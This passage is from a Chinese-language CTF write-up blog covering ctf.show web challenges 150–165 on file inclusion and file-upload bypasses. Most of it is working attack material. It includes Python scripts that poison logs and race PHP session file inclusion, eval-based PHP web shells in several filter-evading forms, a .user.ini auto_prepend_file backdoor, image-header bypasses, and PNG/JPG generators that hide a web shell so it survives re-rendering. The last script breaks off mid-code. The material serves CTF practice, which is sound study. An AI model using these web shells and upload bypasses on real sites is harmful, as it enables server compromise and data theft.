<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/7 11:50</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5166dd5a-495e-4cd2-bad1-6a13b1cba45a.chall.ctf.show:8080/&quot;</span> + <span class="string">&quot;?isVIP=1&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span>: <span class="string">&#x27;/var/log/nginx/access.log&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dotast&#x27;</span>:<span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">result = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure>
<p>运行后得到flag</p>
<h3 id="web150-plus"><a class="header-anchor" href="#web150-plus">¶</a>web150_plus</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line">    <span class="keyword">private</span> $vip;</span><br><span class="line">    <span class="keyword">private</span> $secret;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params">$class</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line">$key = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, $key))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($isVIP &amp;&amp; strrpos($ctf, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; strrpos($ctf,<span class="string">&quot;log&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>($ctf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上一题的基础上ban了log字符，所以不能使用日志包含，但发现可以使用session进行文件包含，知识点忘记的可以看前面写的web82<br>
web82写的脚本改改直接用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/7 14:57</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://7eda1482-7964-4319-96d3-1689b4a62307.chall.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">10</span>)</span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dota.txt&#x27;</span>, f)&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;ctf&#x27;</span>:<span class="string">&#x27;/tmp/sess_flag&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.post(url+<span class="string">&#x27;?isVIP=1&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
<p>运行后即可得到flag</p>
<h2 id="文件上传-151-170"><a class="header-anchor" href="#文件上传-151-170">¶</a>文件上传(151-170)</h2>
<h3 id="web151"><a class="header-anchor" href="#web151">¶</a>web151</h3>
<p>上传图片马，然后在burpsuie里把后缀png更改为php，再去执行命令即可，制作图片马方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用一张小点的图片和一句话木马，利用copy命令生成图片马</span><br><span class="line">copy 1.png&#x2F;b+2.php&#x2F;a 3.png</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151/0YSHJ%7B%40I0T6KYXO29D_Q28L.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151/WWO85%7DNV%5BN~X%5B%29JU%7BG4VO5N.png" alt=""></p>
<h3 id="web152"><a class="header-anchor" href="#web152">¶</a>web152</h3>
<p>和上题一样的方法</p>
<h3 id="web153"><a class="header-anchor" href="#web153">¶</a>web153</h3>
<p>开始对php后缀进行了限制，这里我们利用<code>.user.ini</code>来构造后门</p>
<blockquote>
<p>php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。</p>
</blockquote>
<p>这里说一下php中的两个配置项</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;filename      &#x2F;&#x2F;包含在文件头</span><br><span class="line">auto_append_file&#x3D;filename       &#x2F;&#x2F;包含在文件尾</span><br></pre></td></tr></table></figure>
<p>举个例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;.user.ini</span><br><span class="line">auto_prepend_file&#x3D;1.png</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1.png</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1.php(任意php文件)</span><br></pre></td></tr></table></figure>
<p>满足这三个文件在同一目录下，则相当于在1.php文件里插入了包含语句<code>require('1.png')</code>，进行了文件包含，所以我们就依次上传即可</p>
<p>首先上传<code>.user.ini</code>文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153/MTSOG%5B4H0OV0%28U52%7B%7DDQW11.png" alt=""><br>
接着上传一个图片马<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153/6BXA%29G%60IR%5B2%29T35_~6%60%5B%40A9.png" alt=""><br>
然后访问upload目录，即<code>做题地址+/upload</code>即可，因为此目录下原本有个index.php，接着再执行我们的一句话木马获取flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153/8K786RK91XNNQD0P%292%600X6K.png" alt=""></p>
<h3 id="web154"><a class="header-anchor" href="#web154">¶</a>web154</h3>
<p>继续按照上题步骤，传一个<code>.user.ini</code>文件，接着在上传图片马的时候报错了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154/%25QP8%60%25S%29ZYBOT%28S%60_%29T9E%295.png" alt=""><br>
解码后显示的文字是不支持格式，说明可能内容里的php被ban了，改成短标签的形式再上传，发现可以通过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">短标签形式：&lt;?&#x3D;system(&quot;tac ..&#x2F;f*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154/49%24EVN%25EGTU2X%290X0%7B5%28F2D.png" alt=""><br>
接着再访问upload目录，即可得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154/HI%7DZZ%2885N%5D8J%258S7%24Y08XDC.png" alt=""></p>
<h3 id="web155"><a class="header-anchor" href="#web155">¶</a>web155</h3>
<p>用上题(web154)的办法可以通过</p>
<h3 id="web156"><a class="header-anchor" href="#web156">¶</a>web156</h3>
<p>用上题(web154)的办法可以通过</p>
<h3 id="web157"><a class="header-anchor" href="#web157">¶</a>web157</h3>
<p>一样用上题(web154)的办法可以通过，但过滤了分号，把短标签后面的<code>;</code>去掉，即</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">短标签形式：&lt;?&#x3D;system(&quot;tac ..&#x2F;f*&quot;)?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web158"><a class="header-anchor" href="#web158">¶</a>web158</h3>
<p>和上题一样的做法</p>
<h3 id="web159"><a class="header-anchor" href="#web159">¶</a>web159</h3>
<p>这里把()给ban了，我们采用反引号来执行命令，即</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">短标签形式：&lt;?&#x3D;&#96;tac ..&#x2F;f*&#96;?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web160"><a class="header-anchor" href="#web160">¶</a>web160</h3>
<p>依旧上传个<code>.user.ini</code>文件，但在传图片马的时候把反引号给ban了，我们使用include命令去配合php伪协议进行读取，因为把php给ban了，所以我们需要拼接起来，即</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;include&quot;ph&quot;.&quot;p:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;flag.p&quot;.&quot;hp&quot;?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160/0%404S4D%28_JME9O%60DP%25A%28UC6Y.png" alt=""><br>
上传后访问upload目录<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160/ND%25%5D_ZJ6%60%28F4%25XNI%5D2XAPLE.png" alt=""><br>
接着再base64解码即可得到flag</p>
<h3 id="web161"><a class="header-anchor" href="#web161">¶</a>web161</h3>
<p>这次上传失败了，尝试在头部加了图片文件头，就过去了，所以这里应该是用了getimagesize()进行检测</p>
<blockquote>
<p><strong>getimagesize():</strong> 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p>
</blockquote>
<p>所以在上题的基础上都加个GIF89a图片头就可以了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161/CQ%5D%7B%25E%40MBYWM%40RD~BGK0%28U4.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161/O8~YOH%5BXKF5%28MCGY406~%286H.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161/Q6%40AG%7BQ%25K1R%7D9%40Y1DP6BH4J.png" alt=""><br>
接着进行base64解码即可得到flag</p>
<h3 id="web162"><a class="header-anchor" href="#web162">¶</a>web162</h3>
<p>这次把<code>.</code>给ban了，我们使用session文件包含，又忘记知识点的可以去看web82；还是一样先上传<code>.user.ini	</code>，内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;&#x2F;tmp&#x2F;sess_muma</span><br></pre></td></tr></table></figure>
<p>接着再运行脚本即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/8 17:06</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://3238a505-5728-4702-b83b-98460ec17f8d.chall.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;GIF89a\ndotast&#x27;</span>)</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.png&#x27;</span>, f, <span class="string">&#x27;image/png&#x27;</span>)&#125;</span><br><span class="line">        response = session.post(url+<span class="string">&quot;upload.php&quot;</span>,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;muma&#x27;</span>&#125;, data=data, files=files)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
<p>运行完后得到flag</p>
<h3 id="web163"><a class="header-anchor" href="#web163">¶</a>web163</h3>
<p>和上题一样采用session文件包含</p>
<h3 id="web164"><a class="header-anchor" href="#web164">¶</a>web164</h3>
<p>题目说开始改头换面了，先右键查看源码，发现有个download.php?image=<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web164/~_12SV4YLA4A7I10JF9WDTS.png" alt=""><br>
猜测有可能是上传图片马，然后文件包含执行命令，我们先上传一个图片马<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web164/_TG%404%5D2VDJ~36D%60G%40S613XV.png" alt=""><br>
点击查看图片，跳转到图片页面，但发现执行不了，crtl+s把图片下载下来后，对比之前的图片发现马被弄没了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web164/R77H7B%24%2998%2489%40%5BC%259TNJ%7B1.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web164/L2KWH%7DKO0FXYTUEXS%5BUIXPU.png" alt=""><br>
应该是经过了二次刷新，这里用之前收集的外国师傅的脚本来生成图片马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*&lt;?$_GET[0]($_POST[1]);?&gt;*/</span></span><br><span class="line"></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">    $r = $p[$y];</span><br><span class="line">    $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">    $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">    $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">    imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">&#x27;1.png&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>需要安装php的gd库，使用命令<code>sudo apt-get install php-gd</code>进行安装，然后运行，生成1.png<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web164/MZQ8WG%40%5D1R%7B0O9%5B%25EK%400H%7BC.png" alt=""><br>
接着上传生成的图片马，然后访问图片地址，抓包post执行命令即可得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web164/Y2LT_J5_3WXPZZJ%60AHHKMFS.png" alt=""></p>
<h3 id="web165"><a class="header-anchor" href="#web165">¶</a>web165</h3>
<p>这次变成jpg了，在网上找了对应的二次渲染的脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">	It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">	2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">	jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">	1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">	2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">	If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	See also:</span></span><br><span class="line"><span class="comment">	https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	$miniPayload = <span class="string">&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">		$nullbytePayloadSize = $pad;</span><br><span class="line">		$dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">		$outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">		$extraBytes = <span class="number">0</span>;</span><br><span class="line">		$correctImage = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">			$marker = $dis-&gt;readByte();</span><br><span class="line">			$size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">			$dis-&gt;skip($size);</span><br><span class="line">			<span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">				$startPos = $dis-&gt;seek();</span><br><span class="line">				$outStreamTmp = </span><br><span class="line">					substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">					$miniPayload . </span><br><span class="line">					str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize) . </span><br><span class="line">					substr($outStream, $startPos);</span><br><span class="line">				checkImage(<span class="string">&#x27;_&#x27;</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="literal">TRUE</span>);</span><br><span class="line">				<span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">						<span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">							<span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					$stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">					$imageStreamSize = $stopPos - $startPos;</span><br><span class="line">					$outStream = </span><br><span class="line">						substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">						$miniPayload . </span><br><span class="line">						substr(</span><br><span class="line">							str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize).</span><br><span class="line">								substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">							<span class="number">0</span>,</span><br><span class="line">							$nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">								substr($outStream, $stopPos);</span><br><span class="line">				&#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">					$outStream = $outStreamTmp;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	unlink(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> 